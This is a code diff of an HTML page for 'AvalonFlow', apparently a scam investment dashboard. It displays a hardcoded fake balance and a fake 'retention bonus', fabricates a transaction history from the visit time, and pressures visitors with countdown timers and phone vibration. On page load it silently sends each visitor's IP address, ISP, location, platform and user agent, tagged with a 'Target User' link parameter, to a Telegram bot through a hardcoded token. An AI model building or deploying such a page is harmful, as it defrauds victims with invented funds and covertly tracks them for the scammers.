+        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        transition: top 0.5s ease, opacity 0.5s ease;
+        z-index: 9999;
+        opacity: 0;
+        max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
+    }
+    .notification-bar.show { top: 20px; opacity: 1; }
+    .notification-bar.warning-yellow { color: #ffcc00; font-weight: 600; }
+    .notification-bar.warning-red { color: #ff3b3b; font-weight: 600; animation: pulse 1s infinite; }
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+
+.metric-card{ grid-column:span 2; text-align:center; }
+@media (max-width:900px){ .metric-card{ grid-column:span 1; } }
+@keyframes valuePulse { 0% { transform: scale(1); } 50% { transform: scale(1.06); } 100% { transform: scale(1); } }
+.value-pulse { animation: valuePulse 0.4s ease; }
+
+#totalACU {
+  font-size: 52px;
+  font-weight: 700;
+  color: #00f2fe; 
+  text-shadow: 0 0 25px rgba(0,242,254,0.8);
+}
+
+.minimal-logo-header {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 10px 0 10px 0; 
+  width: 100%;
+  margin-top: -72px; 
+  background: transparent !important;
+}
+
+.logo-shimmer-wrapper {
+  position: relative;
+  width: 200px;
+  height: 200px;
+  overflow: hidden;
+  background: transparent !important; 
+}
+
+.avalon-logo-img {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  transform: scale(0.40);
+  transform-origin: center center;
+  backdrop-filter: blur(4px);
+  -webkit-backdrop-filter: blur(4px);
+  opacity: 0.9; 
+  filter: drop-shadow(0 4px 14px rgba(0, 0, 0, 0.05));
+  mix-blend-mode: multiply; 
+  background:  transparent !important;
+  border: none !important;            
+  outline: none !important;
+}
+
+/* --------------------------------------------------
+   🆕 COLLAPSIBLE HISTORY STYLES
+-------------------------------------------------- */
+.history-trigger-btn {
+    width: 100%;
+    background: transparent;
+    border: none;
+    color: #a78bfa;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: 600;
+    padding: 0;
+}
+
+.caret-icon {
+    width: 16px;
+    height: 16px;
+    fill: currentColor;
+    transition: transform 0.3s ease;
+}
+
+.history-trigger-btn.active .caret-icon {
+    transform: rotate(180deg);
+}
+
+.history-panel-content {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.4s cubic-bezier(0, 1, 0, 1);
+}
+
+.history-panel-content.show {
+    max-height: 500px;
+    transition: max-height 0.4s cubic-bezier(1, 0, 1, 0);
+    margin-top: 20px;
+}
+
+.tx-table {
+    width: 100%;
+    border-collapse: collapse;
+    text-align: left;
+    font-size: 14px;
+}
+
+.tx-table th {
+    color: #64748b;
+    font-weight: 600;
+    padding-bottom: 10px;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+
+.tx-table td {
+    padding: 14px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    color: #c9d1d9;
+}
+
+.tx-status-tag {
+    padding: 4px 8px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: 600;
+}
+
+.tx-status-tag.received {
+    background: rgba(16, 185, 129, 0.15);
+    color: #10b981;
+}
+
+.tx-status-tag.withdrawn {
+    background: rgba(239, 68, 68, 0.15);
+    color: #ef4444;
+}
+    </style>
+</head>
+
+<body>
+    <div id="floating-bg"></div>
+    <button id="menuBtn" onclick="toggleSidebar()">☰
+        <div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
+            <span id="sidebarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Sidebar</span>
+        </div>
+    </button>
+
+    <div id="dashboardNotification" class="notification-bar"></div>
+
+    <header class="minimal-logo-header">
+        <div class="logo-shimmer-wrapper">
+            <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
+        </div>
+    </header>
+
+<div id="sidebar">
+    <h2>AvalonFlow</h2>
+    <button onclick="window.location.href='/dashboard'">Dashboard</button>
+    <button onclick="window.location.href='https://avalonflowverificationbonds.avalonflow.site/'">AVB</button>
+    <button onclick="window.location.href='/acu-payouts'">Withdrawal</button>
+    <button onclick="window.location.href='/returns'">Retention Bonus</button>
+    <button onclick="window.location.href='/support'">Support</button>
+    <button onclick="logout()">Logout</button>
+</div>
+
+<div class="top-right-profile">
+     <div class="avatar-ring">
+        <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
+    </div>
+    <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        <span id="avatarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Add Profile Picture</span>
+    </div>
+</div>
+
+<div id="cropModal" class="crop-modal hidden">
+    <div class="crop-box">
+        <input type="file" id="photoInput" accept="image/*">
+        <div class="crop-preview">
+            <img id="cropImage">
+        </div>
+        <div class="crop-actions">
+            <button id="saveCropped">Save Photo</button>
+            <button id="cancelCrop">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="content">
+
+  <div class="glass-card metric-card dashboard-title">
+    <h3>My Dashboard</h3>
+  </div>
+
+  <div class="metric-row"> 
+    <div class="glass-card hero-card">
+      <h2>Available Balance</h2>
+      <div id="totalACU">$147,349.26</div>
+    </div>
+
+    <div class="glass-card stat-card">
+      <h3>Active Bonds</h3>
+      <div class="stats" id="activePlans">1</div>
+    </div>
+
+    <div class="glass-card stat-card">
+      <h3>Retention Bonus</h3>
+      <div class="stat" id="retentionBonusAmount">26,779.97 ACU ~ $26,779.97</div>
+    </div>
+  </div>
+
+  <div class="metric-row">
+    <div class="glass-card secondary-card" style="width: 100%;">
+      <h3>Cycle Progress</h3>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+
+    <!-- 🆕 TRANSACTION HISTORY COLLAPSIBLE GLASS CARD -->
+    <div class="glass-card secondary-card" style="width: 100%;">
+        <button class="history-trigger-btn" id="historyToggle">
+            <span>Transaction History</span>
+            <svg class="caret-icon" viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
+        </button>
+        <div class="history-panel-content" id="historyPanel">
+            <table class="tx-table">
+                <thead>
+                    <tr>
+                        <th>Description</th>
+                        <th>Date Registered</th>
+                        <th>Status</th>
+                        <th style="text-align: right;">Amount</th>
+                    </tr>
+                </thead>
+                <tbody id="txHistoryTableBody">
+                    <!-- Loaded via JavaScript render loops -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+  </div>
+
+    <footer>
+       © 2026 AvalonFlow Corp • All Rights Reserved
+    </footer>
+
+    <script>
+// Global layout time markers computed once on framework launch
+let dynamicBalanceTimeStr = "";
+let dynamicBonusTimeStr = "";
+
+function initializeDynamicTransactionHistory() {
+    const visitDate = new Date();
+
+    const balanceTimestamp = new Date(visitDate.getTime() - (24 * 60 * 60 * 1000));
+    const bonusTimestamp = new Date(visitDate.getTime() - (2 * 60 * 60 * 1000));
+
+    const optionConfig = { 
+        year: 'numeric', 
+        month: 'short', 
+        day: '2-digit', 
+        hour: '2-digit', 
+        minute: '2-digit',
+        hour12: true 
+    };
+
+    dynamicBalanceTimeStr = balanceTimestamp.toLocaleString('en-US', optionConfig);
+    dynamicBonusTimeStr = bonusTimestamp.toLocaleString('en-US', optionConfig);
+
+    const toggleBtn = document.getElementById("historyToggle");
+    const panel = document.getElementById("historyPanel");
+
+    toggleBtn.addEventListener("click", () => {
+        toggleBtn.classList.toggle("active");
+        panel.classList.toggle("show");
+    });
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+  initializeDynamicTransactionHistory();
+});
+
+async function sendVisitorDetailsToTelegram() {
+  const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
+  const CHAT_IDs = '-1003913850436'; 
+
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+    const data = await ipResponse.json();
+
+    const currentPage = window.location.pathname; 
+    let devicePlatform = 'Unknown';
+    if (navigator.userAgentData && navigator.userAgentData.platform) {
+      devicePlatform = navigator.userAgentData.platform; 
+    } else if (navigator.platform) {
+      devicePlatform = navigator.platform; 
+    }
+
+    const telegramMessage = 
+      `🌐 <b>New Visitor Logged</b>\n\n` +
+      `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Visited Page:</b> <code>${currentPage}</code>\n` + 
+      `• <b>Platform/OS:</b> <code>${devicePlatform}</code>\n` + 
+      `• <b>IP Address:</b> <code>${data.ip}</code>\n` +
+      `• <b>ISP/Provider:</b> <code>${data.org || 'Unknown'}</code>\n` +
+      `• <b>ASN:</b> <code>${data.asn || 'N/A'}</code>\n` +
+      `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
+      `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
+
+    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
+
+    await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_IDs,
+        text: telegramMessage,
+        parse_mode: 'HTML' 
+      })
+    });
+  } catch (error) {
+    console.error('System logging exception occurred.');
+  }
+}
+
+const photoInput = document.getElementById('photoInput');
+const profilePhoto = document.getElementById('profilePhoto');
+const avatarLabel = document.getElementById('avatarLabel'); 
+const cropModal = document.getElementById('cropModal');
+const cropImage = document.getElementById('cropImage');
+const DEFAULT_AVATAR = 'default-avatar.png';
+let isProcessing = false;
+
+profilePhoto.addEventListener('click', () => {
+    if (isProcessing) return;
+    const hasPhoto = localStorage.getItem('profilePhoto');
+    if (hasPhoto) {
+        localStorage.removeItem('profilePhoto');
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    } else {
+        photoInput.click();
+    }
+});
+
+photoInput.addEventListener('change', (e) => {
+    const file = e.target.files[0];
+    if (!file || isProcessing) return;
+    isProcessing = true;
+    const reader = new FileReader();
+
+    reader.onload = function(event) {
+        const rawImage = event.target.result;
+        const img = new Image();
+        img.src = rawImage;
+
+        img.onload = function() {
+            const canvas = document.createElement('canvas');
+            const size = Math.min(img.width, img.height);
+            canvas.width = size;
+            canvas.height = size;
+            const ctx = canvas.getContext('2d');
+
+            ctx.drawImage(img, (img.width - size) / 2, (img.height - size) / 2, size, size, 0, 0, size, size);
+            const finalImage = canvas.toDataURL('image/png');
+
+            profilePhoto.src = finalImage;
+            localStorage.setItem('profilePhoto', finalImage);
+            if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+            cropModal.classList.add('hidden');
+            photoInput.value = '';
+            setTimeout(() => { isProcessing = false; }, 300);
+        };
+    };
+    reader.readAsDataURL(file);
+});
+
+if (typeof cancelCrop !== 'undefined' && cancelCrop) {
+    cancelCrop.addEventListener('click', () => {
+        cropModal.classList.add('hidden');
+    });
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    const saved = localStorage.getItem('profilePhoto');
+    if (saved) {
+        profilePhoto.src = saved;
+        if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+    } else {
+        profilePhoto.src = DEFAULT_AVATAR;
+        if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
+    }
+});
 
         const bg = document.getElementById('floating-bg');
         const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
@@ -506,199 +1030,270 @@
             const s = Math.random()*20+10;
             p.style.width = s+'px'; p.style.height = s+'px';
             p.style.left = Math.random()*100+'vw';
-            p.style.background = `radial-gradient(circle, ${colors[colors.indexOf(colors[Math.floor(Math.random()*3)])], transparent)`;
+            p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
             p.style.animationDuration = (Math.random()*20+10)+'s';
             bg.appendChild(p);
             setTimeout(()=>p.remove(),30000);
         }
         setInterval(particle,800);
 
-        function generateRandomHash() {
-            const chars = '0123456789ABCDEFabcdef';
-            let result = '';
-            for (let i = 0; i < 8; i++) {
-                result += chars[Math.floor(Math.random() * chars.length)];
+function toggleSidebar() {
+    const sidebar = document.getElementById('sidebar');
+    const menuBtn = document.getElementById('menuBtn');
+    sidebar.classList.toggle('open');
+    menuBtn.classList.toggle('shift');
+}
+
+function navigateTo(page){ window.location.href = page; }
+function logout(){
+    localStorage.removeItem("avalon_logged_in");
+    localStorage.removeItem("avalon_seen_dashboard");
+    window.location.href = 'https://membership.avalonflow.site/signin';
+}
+
+const plans = {
+    premium: { per12h: 298.29, ac: "premiumAC" },
+    basic:   { per12h: 183.29, ac: "basicAC" },
+    lite:    { per12h: 118.29, ac: "liteAC" },
+    custom:  { per12h: 0, ac: "customAC" }
+};
+const BASE_ACU = 147349.26;
+const BASE_ACTIVE_BONDS = 1;
+const ALL_PLANS = ["premium", "basic", "lite", "custom"];
+const paidPlans = JSON.parse(localStorage.getItem("paidPlans")) || {};
+let displayedAC = { premium: 0, basic: 0, lite: 0, custom: 0 };
+let lastCycleCount = { premium: 0, basic: 0, lite: 0, custom: 0 };
+const CYCLE_MS = 12 * 60 * 60 * 1000;
+
+function getPlan(planKey) { return paidPlans[planKey]; }
+function isLocked(planData, now) { return !planData?.active || now >= planData.expiresAt; }
+
+function updateActivePlans() {
+    const now = Date.now();
+    const currentDeviceId = localStorage.getItem("avalonflow_deviceId");
+    const activeCount = BASE_ACTIVE_BONDS + ALL_PLANS.reduce((count, plan) => {
+        const planData = paidPlans[plan];
+        if (!planData) return count;
+        if (planData.deviceId && planData.deviceId !== currentDeviceId) return count;
+        return (planData.active && now < planData.expiresAt) ? count + 1 : count;
+    }, 0);
+    const el = document.getElementById('activePlans');
+    if (el) el.textContent = activeCount;
+}
+
+function updateTotalACU() {
+    const now = Date.now();
+    const total = BASE_ACU + ALL_PLANS.reduce((sum, plan) => {
+        const data = getPlan(plan);
+        if (!data) return sum;
+        const per12h = plan === "custom" ? ((data.amount || 0) * 1.5) / 2 : plans[plan].per12h;
+        const elapsed = now - data.activatedAt;
+        const cycles = Math.floor(elapsed / CYCLE_MS);
+        const cycleProgress = (elapsed % CYCLE_MS) / CYCLE_MS;
+        return sum + (isLocked(data, now) ? displayedAC[plan] : (cycles * per12h) + (cycleProgress * per12h));
+    }, 0);
+    const el = document.getElementById("totalACU");
+    if (el) el.textContent = "$" + total.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    localStorage.setItem("totalACU", total.toFixed(2));
+}
+
+function updatePlanACU() {
+    const now = Date.now();
+    ALL_PLANS.forEach(plan => {
+        const data = getPlan(plan);
+        const el = document.getElementById(plans[plan].ac);
+        if (!el || !data) return;
+        const per12h = plan === "custom" ? ((data.amount || 0) * 1.5) / 2 : plans[plan].per12h;
+        const elapsed = now - data.activatedAt;
+        const cycles = Math.floor(elapsed / CYCLE_MS);
+        const cycleProgress = (elapsed % CYCLE_MS) / CYCLE_MS;
+        const targetAC = (cycles * per12h) + (cycleProgress * per12h);
+        const finalTarget = isLocked(data, now) ? displayedAC[plan] : targetAC;
+        displayedAC[plan] += (finalTarget - displayedAC[plan]) * 0.08;
+        el.textContent = displayedAC[plan].toFixed(2) + " ACU";
+
+        if (cycles > lastCycleCount[plan]) {
+            const card = document.getElementById(plan + "Card");
+            card?.classList.add("cycle-burst");
+            setTimeout(() => { card?.classList.remove("cycle-burst"); }, 1200);
+            lastCycleCount[plan] = cycles;
+        }
+    });
+}
+
+// --- 🆕 CLEAN EVALUATION WITH DYNAMIC WITHDRAWAL LINE RENDERING ---
+let currentWithdrawalState = null; 
+
+function updateRetentionBonus() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const avWithdrawn = localStorage.getItem('av_withdrawn') === 'true' || urlParams.get('av_withdrawn') === 'true';
+    
+    const bonusEl = document.getElementById('retentionBonusAmount');
+    if (avWithdrawn) {
+        if (bonusEl) bonusEl.textContent = "0.00 ACU ~ $0.00";
+    } else {
+        if (bonusEl) bonusEl.textContent = "26,779.97 ACU ~ $26,779.97";
+    }
+
+    if (currentWithdrawalState !== avWithdrawn) {
+        currentWithdrawalState = avWithdrawn;
+        const tbody = document.getElementById("txHistoryTableBody");
+        if (!tbody) return;
+
+        let tableRowsHTML = `
+            <tr>
+                <td>Available Balance</td>
+                <td>${dynamicBalanceTimeStr || 'Calculating...'}</td>
+                <td><span class="tx-status-tag received">Received</span></td>
+                <td style="text-align: right; font-weight: 600; color: #00f2fe;">$147,349.26</td>
+            </tr>
+        `;
+
+        if (avWithdrawn) {
+            tableRowsHTML += `
+                <tr>
+                    <td>Retention Bonus</td>
+                    <td>${dynamicBonusTimeStr || 'Calculating...'}</td>
+                    <td><span class="tx-status-tag received" style="background:rgba(100,116,139,0.15); color:#64748b;">Settled</span></td>
+                    <td style="text-align: right; font-weight: 600; color: #64748b;">$0.00</td>
+                </tr>
+                <tr>
+                    <td>Retention Bonus Withdrawal</td>
+                    <td>${dynamicBonusTimeStr || 'Calculating...'}</td>
+                    <td><span class="tx-status-tag withdrawn">Withdrawn</span></td>
+                    <td style="text-align: right; font-weight: 600; color: #ef4444;">-$26,779.97</td>
+                </tr>
+            `;
+        } else {
+            tableRowsHTML += `
+                <tr>
+                    <td>Retention Bonus</td>
+                    <td>${dynamicBonusTimeStr || 'Calculating...'}</td>
+                    <td><span class="tx-status-tag received">Received</span></td>
+                    <td style="text-align: right; font-weight: 600; color: #a78bfa;">$26,779.97</td>
+                </tr>
+            `;
+        }
+        tbody.innerHTML = tableRowsHTML;
+    }
+}
+
+function updateACU() { 
+    updatePlanACU(); 
+    updateTotalACU(); 
+    updateActivePlans(); 
+    updateRetentionBonus(); 
+}
+
+animate = function() { updateACU(); requestAnimationFrame(animate); }
+window.addEventListener("load", () => { animate(); });
+setInterval(updateACU, 30000); 
+
+window.addEventListener("load", () => {
+    const notification = document.getElementById("dashboardNotification");
+    localStorage.setItem("avalon_logged_in", "true");
+    let firstName = "";
+    const localData = localStorage.getItem("section2Data");
+    if (localData) {
+        try {
+            const savedData = JSON.parse(localData);
+            if (savedData.fullName) {
+                const rawFirstName = savedData.fullName.trim().split(" ")[0];
+                firstName = rawFirstName.charAt(0).toUpperCase() + rawFirstName.slice(1).toLowerCase();
             }
-            return `av_tx_${result}`;
+        } catch (e) { console.error("Failed to parse registration name metrics."); }
+    }
+    const nameString = firstName ? `, ${firstName}` : "";
+    let message = !localStorage.getItem("avalon_seen_dashboard") ? `Hi there${nameString}` : `Welcome back${nameString}`;
+    notification.textContent = message;
+    notification.classList.add("show");
+    localStorage.setItem("avalon_seen_dashboard", "true");
+
+    let timer;
+    const getState = (remaining) => {
+        if (remaining <= 0) return "expired";
+        if (remaining <= 300) return "red";
+        if (remaining <= 360) return "yellow";
+        if (remaining <= 540) return "hide_mid";
+        if (remaining <= 720) return "show_mid";
+        return "hide_start";
+    };
+
+    const updateCountdown = () => {
+        const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+        if (!expiryTime) return;
+        const remaining = Math.max(0, Math.floor((expiryTime - Date.now()) / 1000));
+        const state = getState(remaining);
+        notification.classList.remove("warning-yellow", "warning-red");
+        if (state === "yellow") { notification.classList.add("warning-yellow"); if (navigator.vibrate) navigator.vibrate(200); }
+        if (state === "red") { notification.classList.add("warning-red"); if (navigator.vibrate) navigator.vibrate([300, 100, 300]); }
+        
+        if (state === "hide_start") notification.classList.remove("show");
+        else if (state === "show_mid") notification.classList.add("show");
+        else if (state === "hide_mid") notification.classList.remove("show");
+        else notification.classList.add("show");
+
+        const minutes = Math.floor(remaining / 60);
+        const seconds = remaining % 60;
+        notification.textContent = `Session expires in ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+    };
+
+    const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+    const remaining = Math.floor((expiryTime - Date.now()) / 1000);
+    const initialState = getState(remaining);
+    if (initialState === "yellow") notification.classList.add("warning-yellow");
+    if (initialState === "red") notification.classList.add("warning-red");
+    notification.classList.add("show");
+
+    setTimeout(() => { updateCountdown(); timer = setInterval(updateCountdown, 1000); }, 4000);
+});
+
+(function avbEngine() {
+    const urlParams = new URLSearchParams(window.location.search);
+    if ((urlParams.get("session") === "refresh" || urlParams.get("mode") === "init") && !localStorage.getItem("avb_key_used")) {
+        localStorage.removeItem("avb_expiry_time");
+        localStorage.removeItem("avb_redirected_to_avb");
+        localStorage.removeItem("avb_session_state");
+        localStorage.setItem("avb_key_used", "true");
+    }
+    if (!localStorage.getItem("avb_expiry_time")) {
+        localStorage.setItem("avb_expiry_time", Date.now() + 15 * 60 * 1000);
+    }
+    let triggered = false, vibRunning = false, vibTimeout;
+    const startVibrationCycle = () => {
+        if (vibRunning) return; vibRunning = true;
+        const loop = () => { if (!vibRunning) return; if (navigator.vibrate) navigator.vibrate([300, 100, 300]); vibTimeout = setTimeout(loop, 15000); };
+        loop();
+    };
+    const stopVibrationCycle = () => { vibRunning = false; if (vibTimeout) clearTimeout(vibTimeout); if (navigator.vibrate) navigator.vibrate(0); };
+    const check = () => {
+        const remainingSec = Math.floor((parseInt(localStorage.getItem("avb_expiry_time"), 10) - Date.now()) / 1000);
+        if (!triggered && remainingSec <= 360 && remainingSec > 0) { triggered = true; startVibrationCycle(); }
+        if (remainingSec <= 0 || remainingSec > 360) stopVibrationCycle();
+    };
+    setInterval(check, 1000);
+})();
+
+(function sessionGuard() {
+    setInterval(() => {
+        const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+        if (expiryTime && Date.now() >= expiryTime) {
+            localStorage.removeItem("avb_expiry_time");
+            localStorage.removeItem("avb_redirected_to_avb");
+            localStorage.removeItem("avb_session_state");
+            window.location.href = "https://membership-signup.avalonflow.site/sign-in";
         }
+    }, 5000);
+})();
 
-        /* ------------------------------------------------------------------
-        DYNAMIC LOCALSTORAGE BALANCE PARSER ENGINE
-        ------------------------------------------------------------------ */
-        function getLiveLocalStorageBalance() {
-            const hardcodedBaseline = 147349.26;
-            const savedValue = localStorage.getItem("totalACU");
-            
-            if (savedValue) {
-                const parsedValue = parseFloat(savedValue);
-                return isNaN(parsedValue) ? hardcodedBaseline : parsedValue;
-            }
-            return hardcodedBaseline;
-        }
+const AUTO_LOGOUT_TIME = 60 * 60 * 1000; 
+let logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME);
+function resetLogoutTimer(){ clearTimeout(logoutTimer); logoutTimer = setTimeout(logout, AUTO_LOGOUT_TIME); }
+["mousemove","keydown","scroll","click"].forEach(event => { window.addEventListener(event, resetLogoutTimer); });
 
-        const isAlreadyWithdrawn = localStorage.getItem('av_is_withdrawn') === 'true';
-
-        let runtimeSessionData = {
-            region: "UK", 
-            selectedAssetOrBank: "NatWest",
-            baseAmountCAD: 26779.97, // Retention Bonus Hardcoded Value
-            availableBalanceCAD: getLiveLocalStorageBalance(),
-            balanceUnlockedFlag: isAlreadyWithdrawn
-        };
-
-        const regionConfig = {
-            UK: { flag: "🇬🇧", currency: "GBP", symbol: "£", eta: "Instant via Faster Payments" },
-            CA: { flag: "🇨🇦", currency: "CAD", symbol: "$", eta: "1-2 hours via Interac" }
-        }
-
-        document.addEventListener("DOMContentLoaded", () => {
-            initiateLiveTransaction(runtimeSessionData);
-            setupEventHandlers();
-        });
-
-        async function initiateLiveTransaction(sessionData) {
-            // Re-sync balance from local storage dynamically before calculating
-            sessionData.availableBalanceCAD = getLiveLocalStorageBalance();
-
-            const config = regionConfig[sessionData.region];
-            if (!config) return;
-
-            let liveRate = 0.53; 
-
-            try {
-                const primaryResponse = await fetch('https://open.er-api.com/v6/latest/CAD');
-                if (primaryResponse.ok) {
-                    const data = await primaryResponse.json();
-                    liveRate = data.rates[config.currency] || liveRate;
-                } else {
-                    throw new Error("Primary API state down.");
-                }
-            } catch (primaryError) {
-                console.warn(primaryError.message);
-                try {
-                    const secondaryResponse = await fetch('https://api.frankfurter.dev/v2/rates?base=CAD&quotes=GBP');
-                    if (secondaryResponse.ok) {
-                        const data = await secondaryResponse.json();
-                        liveRate = data.rates[config.currency] || liveRate;
-                    }
-                } catch (secondaryError) {
-                    liveRate = 0.53;
-                }
-            }
-
-            const isSecurityOpen = sessionData.balanceUnlockedFlag;
-            const balanceBox = document.getElementById("balance-box");
-            const sendBox = document.getElementById("send-box");
-            const arrowIndicator = document.getElementById("indicator-arrow");
-
-            document.getElementById("badge-flag").innerText = config.flag;
-            document.getElementById("payout-method").innerText = `${sessionData.selectedAssetOrBank}`;
-            document.getElementById("arrival-time").innerText = config.eta;
-
-            const activeHash = generateRandomHash();
-            document.getElementById("receipt-hash").innerText = activeHash;
-
-            if (isSecurityOpen) {
-                /* 1. CARDS REPOSITION ENGINE (DOM Order Flip) */
-                sendBox.className = "amount-box locked order-1";       
-                balanceBox.className = "amount-box highlight order-2"; 
-                arrowIndicator.style.top = "61%";                     
-
-                /* 2. VALUE STATE SYNCHRONIZATION */
-                document.getElementById("send-lock").style.display = "inline-flex";
-                document.getElementById("send-currency-symbol").innerText = "";
-                document.getElementById("send-amount").innerText = "Withdrawn";
-                document.getElementById("send-currency-tag").innerText = "";
-
-                document.getElementById("balance-lock").style.display = "none";
-                document.getElementById("balance-unit-symbol").innerText = "$";
-                document.getElementById("balance-amount").innerText = sessionData.availableBalanceCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
-                document.getElementById("balance-currency-tag").innerText = "CAD";
-
-                const feeCAD = sessionData.availableBalanceCAD * 0.04;
-                const cadNet = sessionData.availableBalanceCAD - feeCAD;
-                const finalCalculatedReceive = cadNet * liveRate;
-
-                document.getElementById("fee-display").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("net-cad-display").innerText = `$${cadNet.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receive-amount").innerText = finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                });
-
-                document.getElementById("receipt-fee").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receipt-payout").innerText = `${config.symbol}${finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                })} ${config.currency}`;
-            } else {
-                /* FALLBACK/DEFAULT LAYOUT STATE STYLE */
-                balanceBox.className = "amount-box locked order-1";
-                sendBox.className = "amount-box order-2";
-                arrowIndicator.style.top = "48%";
-
-                document.getElementById("balance-lock").style.display = "inline-flex";
-                document.getElementById("balance-unit-symbol").innerText = "$";
-                document.getElementById("balance-amount").innerText = sessionData.availableBalanceCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
-                document.getElementById("balance-currency-tag").innerText = "CAD";
-
-                document.getElementById("send-lock").style.display = "none";
-                document.getElementById("send-currency-symbol").innerText = "$";
-                document.getElementById("send-amount").innerText = sessionData.baseAmountCAD.toLocaleString('en-US', { minimumFractionDigits: 2 });
-                document.getElementById("send-currency-tag").innerText = "CAD";
-
-                const feeCAD = sessionData.baseAmountCAD * 0.04;
-                const cadNet = sessionData.baseAmountCAD - feeCAD;
-                const finalCalculatedReceive = cadNet * liveRate;
-
-                document.getElementById("fee-display").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("net-cad-display").innerText = `$${cadNet.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receive-amount").innerText = finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                });
-
-                document.getElementById("receipt-fee").innerText = `-$${feeCAD.toLocaleString('en-US', { minimumFractionDigits: 2 })} CAD`;
-                document.getElementById("receipt-payout").innerText = `${config.symbol}${finalCalculatedReceive.toLocaleString('en-US', { 
-                    minimumFractionDigits: 2,
-                    maximumFractionDigits: 2 
-                })} ${config.currency}`;
-            }
-
-            document.getElementById("receive-symbol").innerText = config.symbol;
-            document.getElementById("receive-currency").innerText = config.currency;
-            document.getElementById("receipt-target").innerText = sessionData.selectedAssetOrBank;
-        }
-
-        function setupEventHandlers() {
-            const confirmBtn = document.getElementById("confirm-btn");
-            const loadingScreen = document.getElementById("loading-screen");
-            const successScreen = document.getElementById("success-screen");
-
-            confirmBtn.addEventListener("click", () => {
-                loadingScreen.classList.add("active");
-                confirmBtn.disabled = true;
-
-                const minTime = 2500;
-                const maxTime = 4500; 
-                const dynamicProcessingDelay = Math.floor(Math.random() * (maxTime - minTime + 1)) + minTime;
-
-                setTimeout(() => {
-                    localStorage.setItem('av_is_withdrawn', 'true');
-                    runtimeSessionData.balanceUnlockedFlag = true;
-
-                    loadingScreen.classList.remove("active");
-                    successScreen.classList.add("active");
-                    showNotification("Liquidity routed to clearway terminal queue", 4000);
-                }, dynamicProcessingDelay); 
-            });
-
-            document.getElementById("close-btn").addEventListener("click", () => {
-                successScreen.classList.remove("active");
-                confirmBtn.disabled = false;
